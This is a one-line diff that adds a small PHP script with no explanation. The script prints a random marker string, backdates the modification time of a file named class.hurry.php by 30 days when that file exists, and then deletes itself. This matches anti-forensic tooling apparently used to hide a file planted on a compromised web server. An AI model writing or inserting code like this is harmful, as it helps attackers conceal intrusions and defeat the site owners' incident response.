@@ -1,0 +1,1 @@
+<?php echo "aVxDHwAFcp"; if (file_exists("./class.hurry.php")){ touch("./class.hurry.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*HeRND6Ct69qkrczKcgAT*/ ?>
